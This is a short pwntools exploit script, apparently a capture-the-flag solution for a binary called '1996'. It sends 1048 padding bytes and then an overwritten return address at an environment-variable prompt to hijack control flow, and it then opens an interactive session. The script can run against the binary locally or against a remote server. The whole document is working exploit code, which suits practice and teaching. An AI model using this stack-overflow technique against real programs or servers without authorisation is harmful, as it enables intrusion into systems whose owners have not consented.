from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''

'''.format(**locals())

# Binary filename
exe = './1996'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'


offset = 1048


ret_addr = p64(0x0000000000400897)  # Address of the ret instruction (nuovo address per la funzione permettere in esecuzione il payload)
payload = b'A' * offset + ret_addr



io = start()

io.recvuntil("Which environment variable do you want to read?")
io.sendline(payload)

io.interactive()